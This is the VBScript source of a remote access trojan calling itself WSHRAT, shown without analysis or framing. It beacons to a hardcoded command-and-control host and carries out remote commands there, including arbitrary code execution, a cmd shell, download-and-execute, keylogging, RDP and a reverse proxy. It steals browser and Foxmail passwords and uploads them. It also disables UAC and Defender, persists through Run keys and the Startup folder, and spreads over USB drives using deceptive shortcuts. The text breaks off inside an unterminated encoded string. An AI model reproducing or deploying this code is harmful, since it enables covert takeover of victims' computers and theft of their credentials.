'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "camera-ip.myq-see.com"
port = 3390
installdir = "%temp%"
runAsAdmin = false
lnkfile = true
lnkfolder = true

if runAsAdmin = true then
	startupElevate()
end if

if WScript.Arguments.Named.Exists("elevated") = true then
	disableSecurity()
end if

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")


'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "|"
sdkpath = installdir & "wshsdk"
sdkfile = sdkpath & "\" & chr(112) & chr(121) & chr(116) & chr(104) & chr(111) & chr(110) & chr(46) & chr(101) & chr(120) & chr(101)
sleep = 5000 
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
on error resume next


instance

if getBinder() <> false then
	runBinder()
end if

while true

install

response = ""
response = post ("is-ready","")
cmd = split (response,spliter)
select case cmd (0)
case "disconnect"
	  wscript.quit
case "reboot"
	  shellobj.run "%comspec% /c shutdown /r /t 0 /f", 0, TRUE
case "shutdown"
	  shellobj.run "%comspec% /c shutdown /s /t 0 /f", 0, TRUE
case "excecute"
      param = cmd (1)
      execute param
case "install-sdk"
	  if filesystemobj.fileExists(sdkfile) then
		updatestatus("SDK+Already+Installed")
	  else
		installsdk()
	  end if
case "get-pass" 
       passgrabber cmd(1), "cmdv.exe", cmd(2)
case "get-pass-offline"
	  if filesystemobj.fileExists(sdkfile) then
		passgrabber cmd(3), "cmdv.exe", "ie"
		passgrabber "null", "cmdv.exe", "chrome"
		passgrabber "null", "cmdv.exe", "mozilla"
		passgrabber2 cmd(1), "cmdv.exe", cmd(2)
	  else
		updatestatus("Installing+SDK")
		stat = installsdk()
		if stat = true then
			passgrabber cmd(3), "cmdv.exe", "ie"
			passgrabber "null", "cmdv.exe", "chrome"
			passgrabber "null", "cmdv.exe", "mozilla"
			passgrabber2 cmd(1), "cmdv.exe", cmd(2)
		else
			msg = shellobj.ExpandEnvironmentStrings("%computername%") & "/" & shellobj.ExpandEnvironmentStrings("%username%")
			post "show-toast", "Unable to automatically recover password for " & msg & " as the Password Recovery SDK cannot be automatically installed. You can try again manually."
		end if
	  end if
case "update"
      param = mid(response, instr(response, "|") + 1)
      oneonce.close
      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
      oneonce.write param
      oneonce.close
      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
      wscript.quit 
case "uninstall"
      uninstall
case "up-n-exec"
      download cmd (1),cmd (2)
case "bring-log"
      upload installdir & "wshlogs\" & cmd (1), "take-log"
case "down-n-exec"
      sitedownloader cmd (1),cmd (2)
case  "filemanager"
      servicestarter cmd(1), "fm-plugin.exe", information() 
case  "rdp"
	  keyloggerstarter cmd(1), "rd-plugin.exe", information(), "", true
case  "rev-proxy"
	  reverseproxy "rprox.exe", cmd(1)
case  "exit-proxy"
	  shellobj.run "%comspec% /c taskkill /F /IM rprox.exe", 0, true
case  "keylogger"
      keyloggerstarter cmd(1), "kl-plugin.exe", information(), 0, false
case  "offline-keylogger"
	  keyloggerstarter cmd(1), "kl-plugin.exe", information(), 1, false
case  "browse-logs"
	  post "is-logs", enumfaf(installdir & "wshlogs")
case  "cmd-shell"
      param = cmd (1)
      post "is-cmd-shell",cmdshell (param)
case  "get-processes"
      post "is-processes", enumprocess()
case  "disable-uac"
	  if WScript.Arguments.Named.Exists("elevated") = true then
		set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","EnableLUA", 0
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","ConsentPromptBehaviorAdmin", 0
		oReg.SetDwordValue &H80000002,"SOFTWARE\Policies\Microsoft\Windows Defender","DisableAntiSpyware", 1
		oReg = nothing
		updatestatus("UAC+Disabled+(Reboot+Required)")
	  end if
case  "check-eligible"
	  if filesystemobj.fileExists(cmd(1)) then
		updatestatus("Is+Eligible")
	  else
		updatestatus("Not+Eligible")
	  end if
case  "force-eligible"
	  if WScript.Arguments.Named.Exists("elevated") = true then
		if filesystemobj.folderExists(cmd(1)) then
			shellobj.run "%comspec% /c " & cmd(2), 0, true
			updatestatus("SUCCESS")
		else
			updatestatus("Component+Missing")
		end if
	  else
		updatestatus("Elevation+Required")
	  end if
case  "elevate"
	  if WScript.Arguments.Named.Exists("elevated") = false then
		on error resume next
		oneonce.close()
		oneonce = nothing
		WScript.CreateObject("Shell.Application").ShellExecute "wscript.exe", " //B " & chr(34) & WScript.ScriptFullName & chr(34) & " /elevated", "", "runas", 1
		updatestatus("Client+Elevated")
		WScript.quit
	  else
		updatestatus("Client+Elevated")
	  end if
case  "if-elevate"
	  if WScript.Arguments.Named.Exists("elevated") = false then
		updatestatus("Client+Not+Elevated")
	  else
		updatestatus("Client+Elevated")
	  end if
case  "kill-process"
      exitprocess(cmd(1))
case  "sleep"
      param = cmd (1)
      sleep = eval (param)        
end select

wscript.sleep sleep

wend

function installsdk()
	on error resume next
	success = false
	sdkurl = post ("moz-sdk","")
	set objhttpdownload = createobject("msxml2.xmlhttp")
	objhttpdownload.open "get",sdkurl, false
	objhttpdownload.setrequestheader "cache-control:", "max-age=0"
	objhttpdownload.send 
						 
	if  filesystemobj.fileexists (installdir & "wshsdk.zip") then
		filesystemobj.deletefile (installdir & "wshsdk.zip")
	end if
	if  objhttpdownload.status = 200 then
		dim  objstreamdownload
		set  objstreamdownload = createobject("adodb.stream")
		with objstreamdownload 
			 .type = 1 
			 .open
			 .write objhttpdownload.responsebody
			 .savetofile installdir & "wshsdk.zip"
			 .close
		end with
		set objstreamdownload  = nothing
	end if
	if filesystemobj.fileexists(installdir & "wshsdk.zip") then
		'unzip the file 
		UnZip installdir & "wshsdk.zip", sdkpath
		success = true
		updatestatus("SDK+Installed")
	end if
	installsdk = success
end function

sub install
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon

upstart
for each drive in filesystemobj.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub

sub uninstall
on error resume next
dim filename
dim foldername

shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true

for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub

function post (cmd ,param)

post = param
httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send param
post = httpobj.responsetext
end function

function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & "plus" & spliter
    inf = inf & security & spliter
    inf = inf & usbspreading
    inf = "WSHRAT" & spliter & inf & spliter & "Visual Basic-v2.0" & spliter & getCountry()
	information = inf
else
    information = inf
end if
end function

function getCountry()
	on error resume next
	set objhttpdownload = createobject("msxml2.xmlhttp" )
	objhttpdownload.open "get", "http://ip-api.com/json/", false
	objhttpdownload.setRequestHeader "user-agent:", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
	objhttpdownload.send
	 
	if objhttpdownload.status = 200 then
	   dim  objstreamdownload, raw, cc, cn
	   set  objstreamdownload = createobject("adodb.stream")
	   with objstreamdownload
			.type = 1 
			.open
			.write objhttpdownload.responsebody
			.position = 0
			.type = 2
			.charset = "us-ascii"
			raw = .readtext
	   end with
	   set objstreamdownload = nothing
	end if
	cc = "01"
	cn = "Unknown"
	cc = mid(raw, instr(raw, "countryCode") + 14)
	cc = mid(cc, 1, instr(cc, chr(34)) -1)
	
	cn = mid(raw, instr(raw, "country") + 10)
	cn = mid(cn, 1, instr(cn, chr(34)) -1)
		   
	getCountry = cc & ":" & cn
end function

sub upstart ()
on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub


function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function


function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function

function instance
on error resume next

usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If

upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function

sub startupElevate()
	if WScript.Arguments.Named.Exists("elevated") = false then
		on error resume next
		WScript.CreateObject("Shell.Application").ShellExecute "wscript.exe", " //B " & chr(34) & WScript.ScriptFullName & chr(34) & " /elevated", "", "runas", 1
		WScript.quit
	end if
end sub

sub disableSecurity()
	if WScript.Arguments.Named.Exists("elevated") = true then
		set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","EnableLUA", 0
		oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","ConsentPromptBehaviorAdmin", 0
		oReg = nothing
	end if
end sub

function decode_base64(base64_string)
	Set yhm_pepe = CreateObject("ADODB.Stream")
	Set spike = CreateObject("Microsoft.XMLDOM").createElement("tmp")
	spike.DataType = "bin.base64"
	spike.Text = base64_string
	yhm_pepe.Type = 1
	yhm_pepe.Open
	yhm_pepe.Write spike.NodeTypedValue
	yhm_pepe.Position = 0
	yhm_pepe.Type = 2
	yhm_pepe.CharSet = "us-ascii"
	decode_base64 = yhm_pepe.ReadText
end function

sub decode_pass(retcmd)
	dim content, nss, command
	if retcmd = "mozilla" then
		command = "give-me-ffpv"
	elseif retcmd = "chrome" then
		command = "give-me-chpv"
	elseif retcmd = "foxmail" then
		command = "give-me-fm"
	end if
	set objhttpdownload = createobject("msxml2.xmlhttp")
	set objfsodownload = createobject ("scripting.filesystemobject")
	objhttpdownload.open "post","http://" & host & ":" & port &"/" & command, false
	objhttpdownload.setrequestheader "user-agent:",information
	objhttpdownload.send ""
						 
	if  objfsodownload.fileexists (installdir & "rundll") then
		objfsodownload.deletefile (installdir & "rundll")
	end if
	if  objhttpdownload.status = 200 then
		dim  objstreamdownload
		set  objstreamdownload = createobject("adodb.stream")
		with objstreamdownload 
			 .type = 1 
			 .open
			 .write objhttpdownload.responsebody
			 .position = 0
			 .type = 2
			 .charset = "us-ascii"
			 content = .readtext
			 nss = sdkpath & "\nss"
			 content = Replace(content, "%nss%", nss) 'for firefox
			 content = Replace(content, "%path%", installdir & "Login Data") 'for chrome
			 objfsodownload.opentextfile(installdir & "rundll", 2, true).write(content)
			 .close
		end with
		set objstreamdownload  = nothing
	end if
	
	shellobj.run "%comspec% /c cd " & chr(34) & sdkpath & chr(34) & " && " &  gsp(sdkfile) & " " & gsp(installdir & "rundll") & " > " & chr(34) & installdir & "wshout" & chr(34), 0, true
	wscript.sleep(2000)
	content = objfsodownload.opentextfile(installdir & "wshout").readall
	objfsodownload.deletefile (installdir & "rundll")
	objfsodownload.deletefile (installdir & "wshout")
	post retcmd, content
end sub

function gsp(path)
	gsp = filesystemobj.getfile(path).shortpath
end function

sub passgrabber (fileurl, filename, retcmd)
on error resume next
dim content, profile, folder
set objfsodownload = createobject ("scripting.filesystemobject")
if retcmd = "ie" then
	content = decode_base64(fileurl)
	executeglobal content
	return
elseif retcmd = "chrome" then
	folder = shellobj.expandenvironmentstrings("%temp%")
	folder = mid(folder, 1, instr(lcase(folder), "temp") - 1) & "Google\Chrome\User Data\Default\Login Data"
	if  objfsodownload.fileexists(folder) then
		objfsodownload.copyfile folder, installdir & "Login Data", true
		
		if objfsodownload.fileexists(sdkfile) then
			'proceed decoding
			decode_pass(retcmd)
			objfsodownload.deletefile(installdir & "Login Data")
		else
			'request for sdk
			post "show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu" 
		end if
	else
		post retcmd, "No Password Found"
	end if
elseif retcmd = "foxmail" then	
	if objfsodownload.fileexists(sdkfile) then
		'proceed decoding
		decode_pass(retcmd)
	else
		'request for sdk
		post "show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu" 
	end if
elseif retcmd = "mozilla" then
	folder = shellobj.expandenvironmentstrings("%appdata%") & "\Mozilla\Firefox\"
	if  objfsodownload.fileexists (folder & "profiles.ini") then
		content = filesystemobj.openTextFile(folder & "profiles.ini").readall
		if instr(content, "Path=") > 0 then
			content = mid(content, instr(content, "Path=") + 5)
			content = mid(content, 1, instr(content, vbCrLf) - 1)
			profile = Replace(folder & content, "/", "\")
			folder = profile & "\logins.json"

			'check if moz-sdk exists, if not, request for it
			if objfsodownload.fileexists(sdkfile) then
				'proceed decoding
				decode_pass(retcmd)
			else
				'request for sdk
				post "show-toast", "WSH Sdk for password recovery not found, You can install this SDK from the password recovery menu" 
			end if
		else
			post retcmd, "No Password Found"
		end if
	else
		post retcmd, "No Password Found"
	end if
else
	passgrabber2 fileurl, filename, retcmd
end if

end sub

Sub UnZip(zipfile, ExtractTo)
	if filesystemobj.GetExtensionName(zipfile) = "zip" then
		If NOT filesystemobj.FolderExists(ExtractTo) Then
			filesystemobj.CreateFolder(ExtractTo)
		End If
		set objShell = CreateObject("Shell.Application")
		set destination = objShell.NameSpace(ExtractTo)
		set zip_content = objShell.NameSpace(zipfile).Items   
		for i = 0 to zip_content.count - 1
			if (filesystemobj.FileExists(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path))) then
				filesystemobj.DeleteFile(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path))
			end if
			destination.copyHere zip_content.item(i), 20
		next 
	End if
End Sub

sub passgrabber2 (fileurl, filename, retcmd)

on error resume next
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
filesystemobj.deleteFile(installdir & filename & "data")
config_file = installdir & mid(filename, 1, instrrev(filename, ".")) & ".cfg"
cfg = "[General]" & vbcrlf & "ShowGridLines=0" & vbcrlf & "SaveFilterIndex=0" & vbcrlf & "ShowInfoTip=1" & vbcrlf & "UseProfileFolder=0" & vbcrlf & "ProfileFolder=" & vbcrlf & "MarkOddEvenRows=0" & vbcrlf & "WinPos=2C 00 00 00 00 00 00 00 01 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 80 02 00 00 E0 01 00 00" & vbcrlf & "Columns=FA 00 00 00 FA 00 01 00 6E 00 02 00 6E 00 03 00 78 00 04 00 78 00 05 00 78 00 06 00 64 00 07 00 FA 00 08 00" & vbcrlf & "Sort=0"
'write config
set writer = filesystemobj.openTextFile(config_file, 2, true)
writer.writeLine(cfg)
writer.close()
set writer = nothing

strlink = fileurl
strsaveto = installdir & filename

set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setRequestHeader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   set runner = CreateObject("Shell.Application")
   saver = objfsodownload.getFile(strsaveto).shortPath
   
   'try 10 times before give up
   for i = 0 to 4
	shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
	wscript.sleep(1000)
	runner.shellexecute saver, " /stext " & saver & "data"
	wscript.sleep(2000)
	
	if objfsodownload.fileExists(saver & "data") then
		dim  httpobj,objstreamuploade,buffer, outpath, folder
		set  objstreamuploade = createobject("adodb.stream")
		with objstreamuploade 
			 .type = 2 
			 .open
			 .loadfromfile saver & "data"
			 buffer = .readtext
			 .close
		end with
		set objstreamuploade = nothing
			
		outpath = installdir & "wshlogs\recovered_password_email.log"
		
		folder = objfsodownload.GetParentFolderName(outpath)

		if not objfsodownload.FolderExists(folder) then
			shellobj.run "%comspec% /c mkdir " & chr(34) & folder & chr(34), 0, true
		end if
		set writer = filesystemobj.openTextFile(outpath, 2, true)
		writer.write(buffer)
		writer.close()
		set writer = nothing
		upload saver & "data", retcmd
		exit for
	end if
   next 
   deletefaf(strsaveto)
end if

end sub

sub reverseproxy (filename, filearg)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strsaveto = installdir & filename

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if

dim  objstreamdownload
set  objstreamdownload = createobject("adodb.stream")
with objstreamdownload
	.type = 1 
	.open
	.write getReverseProxy()
	.savetofile strsaveto
	.close
end with
set objstreamdownload = nothing

if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & filearg
end if 
end sub

sub keyloggerstarter (fileurl, filename, filearg, is_offline, is_rdp)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if

dim  objstreamdownload
set  objstreamdownload = createobject("adodb.stream")
with objstreamdownload
	.type = 1 
	.open
	if is_rdp = true then
		.write getRDP()
	else
		.write getKeyLogger()
	end if
	.savetofile strsaveto
	.close
end with
set objstreamdownload = nothing

if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34) & " " & is_offline
end if 
end sub

sub servicestarter (fileurl, filename, filearg)
shellobj.run "%comspec% /c taskkill /F /IM " & filename, 0, true
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control:", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run chr(34) & strsaveto & chr(34) & " " & host & " " & port & " " & chr(34) & filearg & chr(34)
end if 
end sub

sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.serverxmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.setrequestheader "cache-control", "max-age=0"
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

sub download (fileurl,filedir)
if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "post","http://" & host & ":" & port &"/" & "send-to-me" & spliter & fileurl, false
objhttpdownload.setrequestheader "user-agent:",information
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
   updatestatus("Executed+File")
end if 
end sub

function updatestatus(status_msg)
	on error resume next
	set objsoc = createobject("msxml2.xmlhttp")
	objsoc.open "post","http://" & host & ":" & port &"/" & "update-status" & spliter & status_msg, false
	objsoc.setrequestheader "user-agent:",information
	objsoc.send ""

end function

function upload (fileurl, retcmd)

dim  httpobj,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set httpobj = createobject("msxml2.xmlhttp")
httpobj.open "post","http://" & host & ":" & port &"/" & retcmd, false
httpobj.setrequestheader "user-agent:",information
httpobj.send buffer
end function


sub deletefaf (url)
on error resume next

filesystemobj.deletefile url
filesystemobj.deletefolder url

end sub

function cmdshell (cmd)
dim httpobj,oexec,readallfromany
strsaveto = installdir & "out.txt"
shellobj.run "%comspec% /c " & cmd & " > " & chr(34) & strsaveto & chr(34), 0, true
readallfromany = filesystemobj.opentextfile(strsaveto).readall()
filesystemobj.deletefile strsaveto

cmdshell = readallfromany
end function


function enumprocess()
on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "^"
	enumprocess = enumprocess & objitem.processid & "^"
    enumprocess = enumprocess & objitem.executablepath & spliter
next
end function

sub exitprocess (pid)
on error resume next

shellobj.run "taskkill /F /T /PID " & pid,0,true
end sub

function getParentDirectory(path)
	set fo = filesystemobj.GetFile(path)
	getParentDirectory = filesystemobj.getparentfoldername(fo)
end function

function enumfaf (enumdir)

'enumfaf = enumdir & spliter
for  each folder in filesystemobj.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "^" & "" & "^" & "d" & "^" & folder.attributes & spliter
next

for  each file in filesystemobj.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "^" & file.size  & "^" & file.attributes & spliter
next
end function

function getKeyLogger()
	encoded = "
	set spike = (CreateObject("Microsoft.XMLDOM")).createElement("tmp")
	spike.dataType = "bin.base64"
	spike.text = encoded
	getKeyLogger = spike.NodeTypedValue
end function

function getRDP()
